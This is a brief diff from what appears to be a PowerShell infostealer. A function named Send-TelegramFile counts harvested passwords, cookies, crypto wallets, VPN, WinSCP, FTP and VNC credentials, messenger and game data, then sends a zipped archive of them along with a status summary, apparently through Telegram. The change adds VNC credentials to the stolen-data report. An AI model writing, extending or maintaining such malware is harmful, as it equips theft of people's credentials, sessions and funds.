@@ -125,9 +125,9 @@ function Send-TelegramFile {
 	$svpnCounter = if ($global:vpnCounter) { $greenCheckMark } else { $redCrossMark }
 	$swinscpCounter = if ($global:winscpCounter) { $greenCheckMark } else { $redCrossMark }
 	$sftpCounter = if ($global:ftpCounter) { $greenCheckMark } else { $redCrossMark }	
-	$vncCounter = if ($global:vncCounter) { $greenCheckMark } else { $redCrossMark }	
+	$svncCounter = if ($global:vncCounter) { $greenCheckMark } else { $redCrossMark }	
 	
-    Send-File -filePath "$ZIPfile" -passwords "$PasswdCount" -cookies "$CookieCount" -wallets "$MoneyCount" -bVPN "$svpnCounter" -bWinSCP "$swinscpCounter" -bFTP "$sftpCounter" -messagers "$messagersCount" -games "$gamesCount"
+    Send-File -filePath "$ZIPfile" -passwords "$PasswdCount" -cookies "$CookieCount" -wallets "$MoneyCount" -bVPN "$svpnCounter" -bWinSCP "$swinscpCounter" -bVNC "$svncCounter" -bFTP "$sftpCounter" -messagers "$messagersCount" -games "$gamesCount"
 }
 function Send-File {
     param (
